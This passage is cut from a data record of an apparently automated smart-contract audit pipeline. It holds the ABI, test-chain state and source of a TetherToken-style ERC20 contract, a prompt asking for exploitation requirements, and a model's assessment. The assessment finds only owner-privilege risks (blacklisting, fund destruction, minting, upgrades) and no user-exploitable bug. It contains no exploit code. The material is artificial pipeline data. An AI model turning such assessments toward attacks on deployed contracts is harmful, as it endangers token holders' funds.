"signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and adjustable fees. It inherits from multiple contracts: `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances and can be used to transfer tokens, approve allowances, and manage token supply via issuing and redeeming tokens. It also supports pausing all token transfers and blacklisting addresses to restrict their token operations. The contract supports deprecation, forwarding calls to an upgraded contract address.\n\nKey features and business logic:  \n- Token transfers with optional fees (basis points and max fee).  \n- Pausable functionality controlled by the owner.  \n- Blacklist mechanism to block malicious users and destroy their tokens.  \n- Ability to issue and redeem tokens by the owner, affecting total supply.  \n- Upgradeability via deprecate function, forwarding calls to a new contract.  \n- Protection against ERC20 short address attack via `onlyPayloadSize` modifier.  \n- Fee parameters capped by hardcoded limits.  \n\nSolidity version:  \n```solidity\npragma solidity ^0.4.17;\n```\n\n---\n\n2. Vulnerability Assessment:\n\n**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause transfers, blacklist addresses, destroy blacklisted users‚Äô tokens, issue new tokens, redeem tokens, change fee parameters, and deprecate the contract.  \n- This centralization means the owner can arbitrarily freeze token transfers, confiscate tokens from blacklisted users, inflate or deflate supply, and redirect token logic to a new contract.  \n- While this may be intended, it poses a trust risk and potential for abuse or compromise.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any address and then destroy all tokens held by that address, reducing total supply.  \n- This is a powerful backdoor to confiscate tokens without user consent.  \n- No timelock or multi-signature protection is present on these critical functions.\n\n**C. Upgradeability and Deprecation**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- This means the owner can effectively replace the token logic at will, which could lead to malicious upgrades or loss of funds if the upgraded contract is malicious or buggy.\n\n**D. Pausable Mechanism**  \n- The owner can pause all token transfers, freezing user funds.  \n- No emergency recovery or decentralized control is implemented.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The contract implements the known mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is good practice, no issue here.\n\n**F. Fee Calculation and Limits**  \n- Fees are calculated as basis points of the transfer amount, capped by a maximum fee.  \n- The owner can set fees but only up to 0.2% (20 basis points) and max fee less than 50 tokens (scaled by decimals).  \n- This limit is hardcoded and prevents excessive fees.\n\n**G. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls in token transfer functions that could cause reentrancy.  \n- No payable functions accepting ETH, so no direct ETH theft risk.\n\n**H. Short Address Attack Mitigation**  \n- The `onlyPayloadSize` modifier is used to prevent short address attacks on transfer, transferFrom, and approve.\n\n---\n\n3. Exploitation Requirements:\n\n- **Owner Key Compromise**: The main risk vector is compromise or malicious behavior of the owner account. If an attacker gains control of the owner key, they can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist arbitrary users and destroy their tokens.  \n  - Issue new tokens to inflate supply and potentially dump them.  \n  - Redeem tokens from owner balance to reduce supply arbitrarily.  \n  - Change fee parameters within limits.  \n  - Deprecate the contract and redirect logic to a malicious upgraded contract.\n\n- **No direct user-exploitable bugs**: There is no direct vulnerability exploitable by regular users or attackers without owner privileges. The contract logic is standard and uses SafeMath.\n\n- **Setup for Exploitation**:  \n  - The attacker must gain control of the owner private key or the owner must act maliciously.  \n  - No other setup is needed.\n\n---\n\n**Summary:**  \nThis contract is a classic example of a centrally controlled token with owner privileges that can affect user balances and token behavior arbitrarily. There are no technical bugs like reentrancy or math errors, but the design inherently trusts the owner with powerful controls that can be abused or compromised, leading to confiscation, freezing, or inflation of tokens.\n\n---\n\n# Final Report\n\n**Contract:** TetherToken  \n**Solidity Version:** ^0.4.17\n\n**Vulnerabilities:**  \n- Centralized owner privileges allow freezing transfers, blacklisting users, destroying tokens, minting new tokens, and upgrading contract logic arbitrarily.  \n- Blacklist and destroyBlackFunds functions act as a backdoor to confiscate tokens.  \n- Upgradeability mechanism allows owner to redirect token logic to any contract, potentially malicious.  \n- Pausable mechanism controlled solely by owner can freeze all token transfers.  \n\n**Potential Impact:**  \n- Loss of user funds via token confiscation or freezing.  \n- Inflation or deflation of token supply by owner.  \n- Forced upgrade to malicious contract.  \n- Complete loss of user control and trust.\n\n**Exploitation Requirements:**  \n- Owner private key compromise or malicious owner action.\n\n---\n\nNo other technical vulnerabilities (reentrancy, math errors, unsafe calls) were found.', 'contract_analysis': 'The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and adjustable fees. It inherits from multiple contracts: `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances and can be used to transfer tokens, approve allowances, and manage token supply via issuing and redeeming tokens. It also supports pausing all token transfers and blacklisting addresses to restrict their token operations. The contract supports deprecation, forwarding calls to an upgraded contract address.\n\nKey features and business logic:  \n- Token transfers with optional fees (basis points and max fee).  \n- Pausable functionality controlled by the owner.  \n- Blacklist mechanism to block malicious users and destroy their tokens.  \n- Ability to issue and redeem tokens by the owner, affecting total supply.  \n- Upgradeability via deprecate function, forwarding calls to a new contract.  \n- Protection against ERC20 short address attack via `onlyPayloadSize` modifier.  \n- Fee parameters capped by hardcoded limits.  \n\nSolidity version:  \n```solidity\npragma solidity ^0.4.17;\n```\n\n---\n\n2.', 'vulnerability_assessment': '**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause transfers, blacklist addresses, destroy blacklisted users‚Äô tokens, issue new tokens, redeem tokens, change fee parameters, and deprecate the contract.  \n- This centralization means the owner can arbitrarily freeze token transfers, confiscate tokens from blacklisted users, inflate or deflate supply, and redirect token logic to a new contract.  \n- While this may be intended, it poses a trust risk and potential for abuse or compromise.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any address and then destroy all tokens held by that address, reducing total supply.  \n- This is a powerful backdoor to confiscate tokens without user consent.  \n- No timelock or multi-signature protection is present on these critical functions.\n\n**C. Upgradeability and Deprecation**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- This means the owner can effectively replace the token logic at will, which could lead to malicious upgrades or loss of funds if the upgraded contract is malicious or buggy.\n\n**D. Pausable Mechanism**  \n- The owner can pause all token transfers, freezing user funds.  \n- No emergency recovery or decentralized control is implemented.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The contract implements the known mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is good practice, no issue here.\n\n**F. Fee Calculation and Limits**  \n- Fees are calculated as basis points of the transfer amount, capped by a maximum fee.  \n- The owner can set fees but only up to 0.2% (20 basis points) and max fee less than 50 tokens (scaled by decimals).  \n- This limit is hardcoded and prevents excessive fees.\n\n**G. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls in token 